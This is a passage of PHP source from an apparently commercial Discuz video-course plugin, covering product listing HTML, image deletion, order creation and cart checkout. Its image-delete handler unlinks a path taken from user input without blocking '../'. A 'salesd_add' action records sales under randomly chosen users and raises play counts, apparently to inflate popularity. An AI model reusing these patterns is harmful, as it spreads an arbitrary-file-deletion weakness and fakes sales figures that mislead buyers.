					$tmpurl=it618_video_getrewrite('video_product',$it618_video_goods['id'],'plugin.php?id=it618_video:product&pid='.$it618_video_goods['id']);
					$home_goodstmp.='<div class="small-goods'.$noml.'">
									  <a class="small-goods-img" href="'.$tmpurl.'" target="_blank"><img src="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'" src="source/plugin/it618_video/images/a.gif" alt="'.$it618_video_goods['it618_name'].'" width="198" height="118" /></a>
									  <h4>
										  <a class="small-goods-name" href="'.$tmpurl.'" target="_blank" title="'.$it618_video_goods['it618_name'].'">'.$it618_video_goods['it618_name'].'</a>
										  <a class="small-goods-text" href="'.$tmpurl.'" target="_blank" title="'.$it618_video_goods['it618_description'].'">'.$it618_video_goods['it618_description'].'</a>
										  <span style="color:#999;line-height:35px;font-weight:normal;font-size:12px"><span style="float:right"><font color=red>'.$it618_video_goods['it618_plays'].'</font>'.it618_video_getlang('s931').'</span>'.$it618_isvip.it618_video_getvideocounttime($it618_video_goods['it618_videocount'],$it618_video_goods['it618_videotime']).'</span>
									  </h4>
									  <div class="small-goods-info">
										  '.$pricestr.'
									  </div>
								  </div>';
				}
				
				if($i%5==0)$home_goodstmp.='</li>';
				$i=$i+1;
			}
		}
		if(($i-1)%5>0)$home_goodstmp.='</li>';
		
		if($templatename=='edu'){
			$home_goodstmp='<div id="'.$_GET['ac1'].'">
							<div class="swiper-container">
								<div class="swiper-wrapper">'.$home_goodstmp.'</div>	
								<div class="pagination pagination-top"></div>
								<div class="button-prev page-btn swiper-button-prev"></div>
								<div class="button-next page-btn swiper-button-next"></div>
							</div>
						</div>';
		}
		
		if($templatename=='mall'){
			$home_goodstmp='<div id="'.$_GET['ac1'].'" class="slider-warp lazy_start" options="'.$_GET['ac1'].'|left|0|5000|1000|1|1|0|1">
							<div class="slider-ulwarp">
								<ul class="slider-ul">'.$home_goodstmp.'</ul>	
							</div>
						</div>';
		}
						
		echo $home_goodstmp;exit;
	}else{
		$home_goodstmp='';
		$width=135;
		while($it618_homegoods = DB::fetch($query)) {
			$it618_video_goods=C::t('#it618_video#it618_video_goods')->fetch_by_id($it618_homegoods['it618_pid']);
			
			if(!it618_video_issecretok($it618_video_goods)){
				continue;
			}
			
			if($it618_video_goods['it618_saleprice']>0||$it618_video_goods['it618_score']>0){
				$pricestr=it618_video_getgoodsprice($it618_video_goods,'goods_price');
			}else{
				$pricestr='<span style="color:#390">'.$it618_video_lang['s106'].'</span>';
			}
			
			$pricestr='<span>'.$pricestr.'</span>';
			
			if($_GET['ac1']=='zjsalegoods'){
				if($IsPinEdu==1){
					if(!$it618_pinedu_goods=C::t('#it618_pinedu#it618_pinedu_goods')->fetch_price_by_it618_shoptype_pid('video',$it618_video_goods['id'])){
						if(!$it618_pinedu_goods=C::t('#it618_pinedu#it618_pinedu_goods')->fetch_score_by_it618_shoptype_pid('video',$it618_video_goods['id'])){
						}
					}
					$it618_pinedu_goods['it618_saleprice']=$it618_pinedu_goods['it618_price'];
					$pricestr='<img src="source/plugin/it618_pinedu/images/goodspin.png" style="height:15px; margin-right:6px;margin-top:-3px;display:inline-table"><span style="color:red">'.it618_video_getgoodsprice($it618_pinedu_goods,'goods_price').'</span>';
				}
			}

			$tmpurl=it618_video_getrewrite('video_wap','product@'.$it618_video_goods['id'],'plugin.php?id=it618_video:wap&pagetype=product&cid='.$it618_video_goods['id']);
			
			$home_goodstmp.='<td width="'.$width.'"><a href="'.$tmpurl.'">
								<img width="'.$width.'" src="'.it618_video_getwapppic($it618_video_goods['it618_shopid'],$it618_video_goods['id'],$it618_video_goods['it618_picbig']).'"/>
								<div class="tdname">'.$it618_video_goods['it618_name'].'</div>
								<div class="tdprice">'.$pricestr.'</div>
							</a>
							</td>';
		}
		echo '<tr>'.$home_goodstmp.'</tr>';exit;
	}
}

if($_GET['formhash']!=FORMHASH)exit;


if($_GET['ac']=="imgdelete"){
	if($uid<=0){
		echo '0';
	}else{
		$shopid=intval($_GET['shopid']);
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		if($shopid==0){
			$shopadmin=explode(",",$it618_video['video_shopadmin']);
			if(!in_array($_G['uid'],$shopadmin)){
				echo '0';exit;
			}
		}else{
			$it618_video_shop=C::t('#it618_video#it618_video_shop')->fetch_by_id($shopid);
			if($it618_video_shop['it618_uid']!=$uid){
				echo '0';exit;
			}
		}
		if($shopid==0){
			$tmparr=explode('source/plugin/it618_video/kindeditor/attached/image/',$_GET['imgurl']);
			if(count($tmparr)>1){
				$delpath=DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/attached/image/'.$tmparr[1];
			}
			$tmparr=explode('source/plugin/it618_video/kindeditor/data/shop',$_GET['imgurl']);
			if(count($tmparr)>1){
				$delpath=DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/data/shop'.$tmparr[1];
			}
		}else{
			$tmparr=explode('source/plugin/it618_video/kindeditor/data/shop'.$shopid.'/',$_GET['imgurl']);
			if(count($tmparr)>1){
				$delpath=DISCUZ_ROOT.'./source/plugin/it618_video/kindeditor/data/shop'.$shopid.'/'.$tmparr[1];
			}
		}
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		if (file_exists($delpath)) {
			$result=unlink($delpath);
			if(it618_video_dirsize(dirname($delpath))==0){
				rmdir(dirname($delpath));
			}
			
			echo '1';
		}else{
			echo '0';
		}
	}
	exit;
}


if($_GET['ac']=="salesd_add"){
	if($uid<=0){
		echo it618_video_getlang('s485');
	}else{
		$pid=intval($_GET['pid']);
		$lid=intval($_GET['lid']);
		$vid=intval($_GET['vid']);
		
		$sd_userpower=C::t('#it618_video#it618_video_set')->getsetvalue_by_setname('sd_userpower');
		$sd_saleuser=C::t('#it618_video#it618_video_set')->getsetvalue_by_setname('sd_saleuser');
		$sd_isgoodstime=C::t('#it618_video#it618_video_set')->getsetvalue_by_setname('sd_isgoodstime');

		$sd_userpowerarr=explode(",",$sd_userpower);
		if(!in_array($uid,$sd_userpowerarr)){
			echo $it618_video_lang['s1058'];exit;
		}
		
		if($sd_saleuser==''){
			echo $it618_video_lang['s1059'];exit;
		}
		$sd_saleuserarr=explode(",",$sd_saleuser);
		$arrindex=array_rand($sd_saleuserarr);
		$uid=$sd_saleuserarr[$arrindex];
		
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		$pid=intval($_GET['pid']);
		$it618_gtypeid=intval($_GET['it618_gtypeid']);
		$it618_count=intval($_GET['it618_count']);

		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		
		if(!($it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id_state($pid,1))){
			echo it618_video_getlang('s487');exit;
		}
		
		if($it618_gtypeid>0){
			if($it618_video_goods_type=C::t('#it618_video#it618_video_goods_type')->fetch_by_idok($it618_gtypeid)){
				$goods_count=$it618_video_goods_type['it618_count'];
				$goods_price=$it618_video_goods_type['it618_saleprice'];
				$goods_jfid=$it618_video_goods_type['it618_jfid'];
				$goods_score=$it618_video_goods_type['it618_score'];
			}else{
				echo it618_video_getlang('s1137');exit;
			}
			
			if($it618_count>$goods_count){
				echo it618_video_getlang('s1138');exit;
			}
		}else{
			if($lid==0&&$vid==0){
				$goods_count=$it618_video_goods['it618_count'];
				$goods_price=$it618_video_goods['it618_saleprice'];
				$goods_jfid=$it618_video_goods['it618_jfid'];
				$goods_score=$it618_video_goods['it618_score'];
			}
			
			if($lid>0&&$vid==0){
				$it618_video_goods_lesson = C::t('#it618_video#it618_video_goods_lesson')->fetch_by_id($lid);
				$goods_count=$it618_video_goods_lesson['it618_count'];
				$goods_price=$it618_video_goods_lesson['it618_saleprice'];
				$goods_jfid=$it618_video_goods_lesson['it618_jfid'];
				$goods_score=$it618_video_goods_lesson['it618_score'];
			}
			
			if($lid>0&&$vid>0){
				$it618_video_goods_video = C::t('#it618_video#it618_video_goods_video')->fetch_by_id($vid);
				$goods_count=$it618_video_goods_video['it618_count'];
				$goods_price=$it618_video_goods_video['it618_saleprice'];
				$goods_jfid=$it618_video_goods_video['it618_jfid'];
				$goods_score=$it618_video_goods_video['it618_score'];
			}
		}
		
		$videopower_sale=it618_video_getpower_sale($uid,$pid,$lid,$vid);
		if($videopower_sale['state']==1){
			echo $videopower_sale['about'];exit;
		}

		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		if($ii1i11i[9]!='e')exit;
		$id = C::t('#it618_video#it618_video_sale')->insert(array(
			'it618_shopid' => $it618_video_goods['it618_shopid'],
			'it618_uid' => $uid,
			'it618_pid' => $pid,
			'it618_lid' => $lid,
			'it618_vid' => $vid,
			'it618_gtypeid' => $it618_gtypeid,
			'it618_count' => $it618_count,
			'it618_price' => $goods_price,
			'it618_state' => 1,
			'it618_time' => $_G['timestamp']
		), true);
		
		C::t('#it618_video#it618_video_goods')->update_it618_plays_by_id($it618_video_goods['id']);
		
		$it618_video_sale=C::t('#it618_video#it618_video_sale')->fetch_by_id($id);
		it618_video_updategoodscount($it618_video_sale);
		
		if($sd_isgoodstime==1){
			it618_video_qrxf($id);
		}

		echo 'ok';
	}
	
	exit;
}


if($_GET['ac']=="pay_add"){
	if($uid<=0){
		echo it618_video_getlang('s485');
	}else{
		set_time_limit (0);
		ignore_user_abort(true);
		
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;

		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_video_salework'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_video_delsalework();
			}
		}
		C::t('#it618_video#it618_video_salework')->insert(array(
			'it618_iswork' => 1
		), true);
		
		$pid=intval($_GET['pid']);
		$lid=intval($_GET['lid']);
		$vid=intval($_GET['vid']);
		$it618_jfid=intval($_GET['it618_jfid']);
		$it618_gtypeid=intval($_GET['it618_gtypeid']);
		$it618_count=intval($_GET['it618_count']);
		
		if($IsUnion==1&&$_GET['tuijcode']!=''){
			require_once DISCUZ_ROOT.'./source/plugin/it618_union/unionsaletc.func.php';
			$it618_tuijid=Union_IsTuiJoin('video',$pid,$_GET['tuijcode']);
		}
		
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		
		if($it618_video['video_certtype']==1){
			if(C::t('#it618_members#it618_members_rzuser')->count_by_uid_rzok($uid)==0){
				echo $it618_video['video_certtip'];it618_video_delsalework();exit;
			}
		}
		
		if($it618_video['video_certtype']==2){
			$tmparr=explode("|",trim($it618_video['video_cert']));
			$tmparr[0]=str_replace('pre_','',$tmparr[0]);
			if(DB::result_first("SELECT count(1) FROM ".DB::table($tmparr[0])." where ".$tmparr[1]."='".$tmparr[2]."' and ".$tmparr[3]."=".$uid)==0){
				echo $it618_video['video_certtip'];it618_video_delsalework();exit;
			}
		}
		
		if($it618_count<=0){
			echo it618_video_getlang('s1135');it618_video_delsalework();exit;
		}
		
		if(!($it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id_state($pid,1))){
			echo it618_video_getlang('s487');it618_video_delsalework();exit;
		}
		
		$it618_video_shop=C::t('#it618_video#it618_video_shop')->fetch_by_id($it618_video_goods['it618_shopid']);
		if($it618_video_shop['it618_issale']!=1){
			echo it618_video_getlang('s513');it618_video_delsalework();exit;
		}
		
		if(!it618_video_issecretok($it618_video_goods)){
			echo it618_video_getlang('s487');it618_video_delsalework();exit;
		}
		
		if($IsGroup==1){
			$salepower=it618_video_groupsalepower($pid);
			if($salepower==1){
				echo it618_video_getlang('s1554');it618_video_delsalework();exit;
			}
			if($salepower==2){
				echo it618_video_getlang('s1555');it618_video_delsalework();exit;
			}
		}
		
		if($it618_gtypeid>0){
			if($it618_video_goods_type=C::t('#it618_video#it618_video_goods_type')->fetch_by_idok($it618_gtypeid)){
				$goods_count=$it618_video_goods_type['it618_count'];
				$goods_price=$it618_video_goods_type['it618_saleprice'];
				$goods_jfid=$it618_video_goods_type['it618_jfid'];
				$goods_score=$it618_video_goods_type['it618_score'];
			}else{
				echo it618_video_getlang('s1137');it618_video_delsalework();exit;
			}
			
			if($it618_video_goods_type['it618_counttype']==1){
				if($it618_count>$goods_count){
					echo it618_video_getlang('s1138');it618_video_delsalework();exit;
				}
				
				if($it618_video_goods_type['it618_xgtime']==0){
					$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_video_sale')." where it618_gtypeid=".$it618_gtypeid." and it618_state=1 and it618_uid=".$uid);
				}else{
					$time=$_G['timestamp']-$it618_video_goods_type['it618_xgtime']*3600*24;
					
					$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_video_sale')." where it618_gtypeid=".$it618_gtypeid." and it618_time>$time and it618_state=1 and it618_uid=".$uid);
				}
				if($buycount=='')$buycount=0;
				
				$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
				if($it618_video_goods_type['it618_xgcount']>0&&$it618_count>$it618_video_goods_type['it618_xgcount']-$buycount){
					if($it618_video_goods_type['it618_xgtime']==0){
						echo it618_video_getlang('s1139').$it618_video_goods_type['it618_xgcount'].it618_video_getlang('s1140').$buycount.it618_video_getlang('s1141');it618_video_delsalework();exit;
					}else{
						echo it618_video_getlang('s1142').$it618_video_goods_type['it618_xgtime'].it618_video_getlang('s1143').$it618_video_goods_type['it618_xgcount'].it618_video_getlang('s1140').$buycount.it618_video_getlang('s1141');it618_video_delsalework();exit;
					}
				}
			}
		}else{
			if($lid==0&&$vid==0){
				$goods_count=$it618_video_goods['it618_count'];
				$goods_price=$it618_video_goods['it618_saleprice'];
				$goods_jfid=$it618_video_goods['it618_jfid'];
				$goods_score=$it618_video_goods['it618_score'];
			}
			
			if($lid>0&&$vid==0){
				$it618_video_goods_lesson = C::t('#it618_video#it618_video_goods_lesson')->fetch_by_id($lid);
				$goods_count=$it618_video_goods_lesson['it618_count'];
				$goods_price=$it618_video_goods_lesson['it618_saleprice'];
				$goods_jfid=$it618_video_goods_lesson['it618_jfid'];
				$goods_score=$it618_video_goods_lesson['it618_score'];
			}
			
			if($lid>0&&$vid>0){
				$it618_video_goods_video = C::t('#it618_video#it618_video_goods_video')->fetch_by_id($vid);
				$goods_count=$it618_video_goods_video['it618_count'];
				$goods_price=$it618_video_goods_video['it618_saleprice'];
				$goods_jfid=$it618_video_goods_video['it618_jfid'];
				$goods_score=$it618_video_goods_video['it618_score'];
			}
		}
		
		$videopower_sale=it618_video_getpower_sale($uid,$pid,$lid,$vid);
		if($videopower_sale['state']==1){
			echo $videopower_sale['about'];it618_video_delsalework();exit;
		}
		
		if($it618_video_goods['it618_xgtype']==1){
			
			$timetmp1=explode(" ",$it618_video_goods['it618_xgtime1']);
			$timetmp2=explode(" ",$it618_video_goods['it618_xgtime2']);
			$timetmp11=explode("-",$timetmp1[0]);
			$timetmp12=explode(":",$timetmp1[1]);
			$timetmp21=explode("-",$timetmp2[0]);
			$timetmp22=explode(":",$timetmp2[1]);
			
			
			$btime=mktime($timetmp12[0], $timetmp12[1], 0, $timetmp11[1], $timetmp11[2], $timetmp11[0]);
			$etime=mktime($timetmp22[0], $timetmp22[1], 0, $timetmp21[1], $timetmp21[2], $timetmp21[0]);
			
			if($etime<$_G['timestamp']){
				echo $it618_video_lang['s1055'];it618_video_delsalework();exit;
			}else{
				if($btime>$_G['timestamp']){
					echo $it618_video_lang['s1056'];it618_video_delsalework();exit;
				}
			}
		}
		
		if($it618_video_goods['it618_xgtype']==2){
			$timetmp1=explode(" ",$it618_video_goods['it618_xgtime1']);
			$timetmp2=explode(" ",$it618_video_goods['it618_xgtime2']);
			$timetmp11=explode("-",$timetmp1[0]);
			$timetmp12=explode(":",$timetmp1[1]);
			$timetmp21=explode("-",$timetmp2[0]);
			$timetmp22=explode(":",$timetmp2[1]);
			
			$btime=mktime($timetmp12[0], $timetmp12[1], 0, $timetmp11[1], $timetmp11[2], $timetmp11[0]);
			$etime=mktime($timetmp22[0], $timetmp22[1], 0, $timetmp21[1], $timetmp21[2], $timetmp21[0]);
			
			if($etime<$_G['timestamp']){
				echo $it618_video_lang['s1055'];it618_video_delsalework();exit;
				
			}else{
				if($btime>$_G['timestamp']){
					echo $it618_video_lang['s1056'];it618_video_delsalework();exit;
				}else{
					$btimecur=mktime($timetmp12[0], $timetmp12[1], 0, date('n'), date('j'), date('Y'));
					$btimecur1=mktime($timetmp12[0], $timetmp12[1], 0, date('n'), date('j')+1, date('Y'));
					$etimecur=mktime($timetmp22[0], $timetmp22[1], 0, date('n'), date('j'), date('Y'));
					
					if($btimecur>$_G['timestamp']){
						echo $it618_video_lang['s1056'];it618_video_delsalework();exit;
					}
					
					if($etimecur<$_G['timestamp']){
						echo $it618_video_lang['s1056'];it618_video_delsalework();exit;
					}
				}
			}
		}

		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;

		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		
		if($it618_video_goods['it618_jfbl']>0){
			$creditnum=C::t('#it618_video#it618_video_sale')->fetch_extcredits_by_uid($it618_video['video_credit'],$it618_video_shop['it618_uid']);
			if($creditnum=="")$creditnum=0;
	
			if($creditnum<$it618_video_shop['it618_score']){
				$shopname=$it618_video_shop['it618_name'];
				$tmpstr=str_replace("{shopname}",$shopname,it618_video_getlang('s1084'));
				$tmpstr=str_replace("{creditname}",$creditname,$tmpstr);
				echo $tmpstr;it618_video_delsalework();exit;
			}
		}
		
		if($IsGroup==1){
			$vipzk=it618_video_getvipzk($pid);
		}
		
		if($vipzk>0){
			$yfmoney=round($goods_price*$it618_count*$vipzk/100,2);
		}else{
			$yfmoney=$goods_price*$it618_count;
		}
		
		if($goods_score>0){
			$goodsjfname=$_G['setting']['extcredits'][$goods_jfid]['title'];
			
			if($vipzk>0){
				$yfscore=intval($goods_score*$it618_count*$vipzk/100);
			}else{
				$yfscore=$goods_score*$it618_count;
			}

			$creditnum=DB::result_first("select extcredits".$goods_jfid." from ".DB::table('common_member_count')." where uid=".$_G['uid']);
			if($creditnum<$yfscore){
				echo it618_video_getlang('s1121').$creditnum.$goodsjfname.it618_video_getlang('s1122');it618_video_delsalework();exit;
			}
		}
		
		$quanid=intval($_GET['quanid']);
		if($quanid>0){
			require_once DISCUZ_ROOT.'./source/plugin/it618_union/function.func.php';
			$it618_union_quansale = C::t('#it618_union#it618_union_quansale')->fetch_by_id($quanid);
			if(it618_union_getisokquan($it618_union_quansale,$it618_video_goods['id'],$yfmoney)==''){
				echo $it618_union_lang['s319'];it618_video_delsalework();exit;
			}
			$it618_quanmoney=it618_union_getquantype($it618_union_quansale,'quanmoney');
			if($yfmoney<$it618_quanmoney){
				$it618_quanmoney=$yfmoney;
			}
			$yfmoney=$yfmoney-$it618_quanmoney;
		}
		
		if($yfmoney>0){
			if($_GET['paytype']==""){
				echo it618_video_getlang('s1069');it618_video_delsalework();exit;
			}
			
			$it618_state=0;
		}else{
			$it618_state=1;
		}
		
		if($ii1i11i[9]!='e')exit;
		$tmptime=$_G['timestamp'];
		$id = C::t('#it618_video#it618_video_sale')->insert(array(
			'it618_shopid' => $it618_video_goods['it618_shopid'],
			'it618_uid' => $uid,
			'it618_pid' => $pid,
			'it618_lid' => $lid,
			'it618_vid' => $vid,
			'it618_gtypeid' => $it618_gtypeid,
			'it618_tuijid' => $it618_tuijid,
			'it618_count' => $it618_count,
			'it618_price' => $goods_price,
			'it618_jfid' => $goods_jfid,
			'it618_score' => $goods_score,
			'it618_quanmoney' => $it618_quanmoney,
			'it618_vipzk' => $vipzk,
			'it618_sfmoney' => $yfmoney,
			'it618_sfscore' => $yfscore,
			'it618_jfbl' => $it618_video_goods['it618_jfbl'],
			'it618_tel' => it618_video_utftogbk($_GET["it618_tel"]),
			'it618_state' => $it618_state,
			'it618_time' => $tmptime
		), true);

		if($id>0){
			if($yfscore>0){
				C::t('common_member_count')->increase($uid, array(
					'extcredits'.$goods_jfid => (0-$yfscore))
				);
			}
			
			if($quanid>0){
				DB::query("update ".DB::table('it618_union_quansale')." set it618_saleid=$id,it618_usetime=$tmptime,it618_state=1 where id=".$quanid);
			}
			
			if($yfmoney==0){
				if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
				if($it618_tuijid>0){
					require_once DISCUZ_ROOT.'./source/plugin/it618_union/unionsaletc.func.php';
					Union_TuiTC_Add($it618_tuijid,$id);
				}
				$it618_video_sale = C::t('#it618_video#it618_video_sale')->fetch_by_id($id);
				it618_video_updategoodscount($it618_video_sale);
				it618_video_qrxf($id);
				
				it618_video_sendmessage('sale_user',$id);
				it618_video_sendmessage('sale_shop',$id);
				it618_video_sendmessage('sale_admin',$id);
				
				echo 'it618_splitjfokit618_split';it618_video_delsalework();exit;	
			}
			
			$saletype='0301';
			$saleid=$id;
			$out_trade_no = date("YmdHis").$saletype.$saleid;
			
			$body=$it618_video_goods["it618_name"];
			
			$total_fee=$yfmoney;
			
			if(video_is_mobile()){ 
				$wap=1;
				if($vid>0){
					$url=$_G['siteurl'].it618_video_getrewrite('video_wap','lesson@'.$vid,'plugin.php?id=it618_video:wap&pagetype=lesson&cid='.$vid);
				}else{
					$url=$_G['siteurl'].it618_video_getrewrite('video_wap','product@'.$pid,'plugin.php?id=it618_video:wap&pagetype=product&cid='.$pid);
				}
			}else{
				$wap=0;
				if($vid>0){
					$url=$_G['siteurl'].it618_video_getrewrite('video_lesson',$vid,'plugin.php?id=it618_video:lesson&lid='.$vid);
				}else{
					$url=$_G['siteurl'].it618_video_getrewrite('video_product',$pid,'plugin.php?id=it618_video:product&pid='.$pid);
				}
			}
			
			require_once DISCUZ_ROOT.'./source/plugin/it618_credits/ajaxpay.func.php';
			$domainurl_paytype=getdomainurl_paytype($_G['siteurl'],$_GET['paytype'],$wap);
			$tmparr=explode("it618_split",$domainurl_paytype);
			$domainurl=$tmparr[0];
			$paytype=$tmparr[1];

			C::t('#it618_credits#it618_credits_salepay')->insert(array(
				'it618_out_trade_no' => $out_trade_no,
				'it618_uid' => $uid,
				'it618_saletype' => $saletype,
				'it618_saleid' => $saleid,
				'it618_paytype' => $paytype,
				'it618_url' => $url,
				'it618_body' => $body,
				'it618_total_fee' => round($total_fee,2),
				'it618_plugin' => 'it618_video',
				'it618_wap' => $wap,
				'it618_state' => 0,
				'it618_client' => $_SERVER['HTTP_USER_AGENT'].'<br>'.$_G['clientip'],
				'it618_time' => $_G['timestamp']
			), true);
		
			$ajaxpay=$domainurl.'plugin.php?id=it618_credits:ajaxpay&out_trade_no='.$out_trade_no;
			
			
			echo "it618_splitokit618_split".$ajaxpay.'it618_split'.$paytype;it618_video_delsalework();
		}else{
			echo it618_video_getlang('s498');it618_video_delsalework();exit;
		}
	}
	exit;
}


if($_GET['ac']=="gwcpay_add"){
	if($uid<=0){
		echo it618_video_getlang('s484');
	}else{
		$count=C::t('#it618_video#it618_video_gwc')->count_by_uid_state($uid);
		if($count>0){
			echo $it618_video_lang['s1799'];exit;
		}
		set_time_limit (0);
		ignore_user_abort(true);

		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_video_salework'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_video_delsalework();
			}
		}
		C::t('#it618_video#it618_video_salework')->insert(array(
			'it618_iswork' => 1
		), true);
		if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
		
		if($it618_video['video_certtype']==1){
			if(C::t('#it618_members#it618_members_rzuser')->count_by_uid_rzok($uid)==0){
				echo $it618_video['video_certtip'];it618_video_delsalework();exit;
			}
		}
		
		if($it618_video['video_certtype']==2){
			$tmparr=explode("|",trim($it618_video['video_cert']));
			$tmparr[0]=str_replace('pre_','',$tmparr[0]);
			if(DB::result_first("SELECT count(1) FROM ".DB::table($tmparr[0])." where ".$tmparr[1]."='".$tmparr[2]."' and ".$tmparr[3]."=".$uid)==0){
				echo $it618_video['video_certtip'];it618_video_delsalework();exit;
			}
		}
		
		$video_gwcpcount=$it618_video['video_gwcpcount'];
		
		$count=C::t('#it618_video#it618_video_gwc')->count_by_uid($uid);
		if($count==0){
			echo it618_video_getlang('s1081');it618_video_delsalework();exit;
		}else if($count>$video_gwcpcount){
			echo str_replace("gwcpcount",$video_gwcpcount,it618_video_getlang('s1082'));it618_video_delsalework();exit;
		}
		
		foreach(C::t('#it618_video#it618_video_gwc')->fetch_all_shopid_by_uid($uid) as $shopids) {
			$it618_video_shop=C::t('#it618_video#it618_video_shop')->fetch_by_id($shopids['it618_shopid']);
			$shopid=$it618_video_shop['id'];
			$shopname=$it618_video_shop['it618_name'];
			$shopnamestr=str_replace("{shopname}",$shopname,it618_video_getlang('s1085'));
			$it618_state=$it618_video_shop['it618_state'];
			
			if($it618_state==0){
				echo str_replace(it618_video_getlang('s1086'),$shopnamestr,it618_video_getlang('s1087'));it618_video_delsalework();exit;
			}elseif($it618_state==1){
				echo str_replace(it618_video_getlang('s1086'),$shopnamestr,it618_video_getlang('s1087'));it618_video_delsalework();exit;
			}else{
				$it618_htstate=$it618_video_shop['it618_htstate'];
				if($it618_htstate==0){
					echo str_replace(it618_video_getlang('s1086'),$shopnamestr,it618_video_getlang('s1088'));it618_video_delsalework();exit;
				}elseif($it618_htstate==2){
					echo str_replace(it618_video_getlang('s1086'),$shopnamestr,it618_video_getlang('s1089'));it618_video_delsalework();exit;
				}
			}
			
			$quanid=intval($_GET['quanid'.$shopid]);
			if($quanid>0){
				require_once DISCUZ_ROOT.'./source/plugin/it618_union/function.func.php';
				$it618_union_quansale = C::t('#it618_union#it618_union_quansale')->fetch_by_id($quanid);
				if(it618_union_getisokquan($it618_union_quansale)==''){
					echo 'it618_splitquanit618_split'.$it618_union_lang['s316'];it618_video_delsalework();exit;
				}
				
				it618_union_setquanmoney($it618_union_quansale);
			}
		}
		
		C::t('#it618_video#it618_video_gwcsale')->delete_by_gwcid_uid(0,$uid);
		$tmptime=$_G['timestamp'];$allsummoney=0;
		foreach(C::t('#it618_video#it618_video_gwc')->fetch_all_by_uid($uid) as $it618_video_gwc) {
			if(lang('plugin/it618_video', $it618_video_lang['it618'])!=$it618_video_lang['version'])exit;
			$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
			if($ii1i11i[3]!='1')exit;
			
			$pid=intval($it618_video_gwc['it618_pid']);
			$lid=intval($it618_video_gwc['it618_lid']);
			$vid=intval($it618_video_gwc['it618_vid']);
			
			$it618_gtypeid=intval($it618_video_gwc['it618_gtypeid']);
			$it618_tujiid=intval($it618_video_gwc['it618_tuijid']);
			$it618_count=intval($it618_video_gwc['it618_count']);
			
			if(!($it618_video_goods = C::t('#it618_video#it618_video_goods')->fetch_by_id_state($it618_video_gwc['it618_pid'],1))){
				echo 'it618_splitgidit618_split'.$it618_video_gwc['id'].'it618_split'.it618_video_getlang('s1090');it618_video_delsalework();exit;
			}
			
			$it618_video_shop=C::t('#it618_video#it618_video_shop')->fetch_by_id($it618_video_goods['it618_shopid']);
			if($it618_video_shop['it618_issale']!=1){
				echo 'it618_splitgidit618_split'.$it618_video_gwc['id'].'it618_split'.it618_video_getlang('s513');it618_video_delsalework();exit;
			}
			
			if($it618_video_goods['it618_jfbl']>0){
				$it618_video_shop=C::t('#it618_video#it618_video_shop')->fetch_by_id($it618_video_goods['it618_shopid']);
				$creditnum=C::t('#it618_video#it618_video_sale')->fetch_extcredits_by_uid($it618_video['video_credit'],$it618_video_shop['it618_uid']);
				if($creditnum=="")$creditnum=0;
		
				if($creditnum<$it618_video_shop['it618_score']){
					$shopname=$it618_video_shop['it618_name'];
					$tmpstr=str_replace("{shopname}",$shopname,it618_video_getlang('s1084'));
					$tmpstr=str_replace("{creditname}",$creditname,$tmpstr);
					echo 'it618_splitgidit618_split'.$it618_video_gwc['id'].'it618_split'.$tmpstr;it618_video_delsalework();exit;
				}
			}
			
			if($it618_gtypeid>0){
				if($it618_video_goods_type=C::t('#it618_video#it618_video_goods_type')->fetch_by_idok($it618_gtypeid)){
					$goods_count=$it618_video_goods_type['it618_count'];
					$goods_price=$it618_video_goods_type['it618_saleprice'];
					$goods_jfid=$it618_video_goods_type['it618_jfid'];
					$goods_score=$it618_video_goods_type['it618_score'];
				}else{
					echo 'it618_splitgidit618_split'.$it618_video_gwc['id'].'it618_split'.it618_video_getlang('s1137');it618_video_delsalework();exit;
				}
				
				if($it618_video_goods_type['it618_counttype']==1){
					if($it618_count>$goods_count){
						echo 'it618_splitgidit618_split'.$it618_video_gwc['id'].'it618_split'.it618_video_getlang('s1138');it618_video_delsalework();exit;
					}
					
					if($it618_video_goods_type['it618_xgtime']==0){
						$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_video_sale')." where it618_gtypeid=".$it618_gtypeid." and it618_state=1 and it618_uid=".$uid);
					}else{
						$time=$_G['timestamp']-$it618_video_goods_type['it618_xgtime']*3600*24;
						
